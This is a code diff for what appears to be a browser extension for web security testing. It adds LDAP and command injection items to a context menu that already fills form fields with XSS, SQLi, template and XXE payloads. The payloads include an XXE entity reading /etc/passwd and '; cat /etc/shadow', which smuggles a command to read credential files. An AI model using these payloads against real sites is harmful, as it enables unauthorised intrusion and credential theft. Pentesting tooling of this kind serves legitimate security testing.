@@ -2,45 +2,60 @@ let elem = 0
 
 browser.menus.create({
   id: "xss-var",
-  title: "Inject XSS with variable name",
+  title: "XSS + variable name",
   documentUrlPatterns: ["*://*/*"],
   contexts: ["editable"],
 });
 
 browser.menus.create({
   id: "xss",
-  title: "Inject simple XSS",
+  title: "Simple XSS",
   documentUrlPatterns: ["*://*/*"],
   contexts: ["editable"],
 });
 
 browser.menus.create({
   id: "simple-sqli",
-  title: "Inject simple quote SQL",
+  title: "Simple quote SQLi",
   documentUrlPatterns: ["*://*/*"],
   contexts: ["editable"],
 });
 
 browser.menus.create({
   id: "double-sqli",
-  title: "Inject double quote SQL",
+  title: "Double quote SQLi",
   documentUrlPatterns: ["*://*/*"],
   contexts: ["editable"],
 });
 
 browser.menus.create({
   id: "template-injection",
-  title: "Inject template",
+  title: "Template Injection",
   documentUrlPatterns: ["*://*/*"],
   contexts: ["editable"],
 });
 
 browser.menus.create({
   id: "xxe-read-file",
-  title: "XXE read file injection",
+  title: "XXE read file",
   documentUrlPatterns: ["*://*/*"],
   contexts: ["editable"],
 });
+
+browser.menus.create({
+  id: "ldap",
+  title: "LDAP injection",
+  documentUrlPatterns: ["*://*/*"],
+  contexts: ["editable"],
+});
+
+browser.menus.create({
+  id: "command",
+  title: "Command injection",
+  documentUrlPatterns: ["*://*/*"],
+  contexts: ["editable"],
+});
+
 
 browser.menus.onClicked.addListener((info, tab) => {
   switch (info.menuItemId) {
@@ -86,7 +101,19 @@ browser.menus.onClicked.addListener((info, tab) => {
         elem.value='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY read SYSTEM "file:///etc/passwd">]><root>&read;</root>'`,
       });
       break;
+    case "ldap":
+      browser.tabs.executeScript(tab.id, {
+        frameId: info.frameId,
+        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
+        elem.value="*()|&'"`,
+      });
+      break;
+    case "command":
+      browser.tabs.executeScript(tab.id, {
+        frameId: info.frameId,
+        code: `elem = browser.menus.getTargetElement(${info.targetElementId});
+        elem.value="; cat /etc/shadow"`,
+      });
+      break;
   }
 });
-
-
